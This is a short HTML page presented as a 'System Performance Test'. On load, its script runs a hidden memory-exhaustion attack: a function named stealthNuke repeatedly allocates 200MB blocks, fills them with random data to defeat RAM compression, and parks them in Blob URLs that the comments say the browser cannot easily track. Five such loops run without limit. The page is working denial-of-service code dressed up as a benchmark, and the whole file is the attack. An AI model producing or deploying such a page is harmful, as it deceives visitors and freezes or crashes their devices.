<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>System Performance Test</title>
    <style>
        body { background: #050505; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }
        #display { font-size: 3rem; text-shadow: 0 0 10px #00ff00; }
    </style>
</head>
<body>
    <div border="1">
        <div>HARDWARE STRESS LEVEL:</div>
        <div id="display">0 GB</div>
    </div>

    <script>
        // Using an array to hold "Leaks" that the browser can't easily track
        const leakContainer = [];
        let totalBytes = 0;

        function stealthNuke() {
            // Allocate 200MB at a time
            const size = 200 * 1024 * 1024;
            const buffer = new Uint8Array(size);

            // Populate with high-entropy data to prevent RAM compression
            for (let i = 0; i < buffer.length; i += 8192) {
                buffer[i] = Math.random() * 255;
            }

            // Convert to a Blob - this moves the data to a different part of the browser memory
            const blob = new Blob([buffer], {type: 'application/octet-stream'});
            leakContainer.push(URL.createObjectURL(blob));

            totalBytes += size;
            const gb = (totalBytes / (1024 * 1024 * 1024)).toFixed(2);
            
            document.getElementById('display').innerText = gb + " GB";

            // Use a slight delay to keep the UI responsive so the numbers actually update
            setTimeout(stealthNuke, 10);
        }

        // Launch multiple threads
        for(let i = 0; i < 5; i++) {
            stealthNuke();
        }
    </script>
</body>
</html>
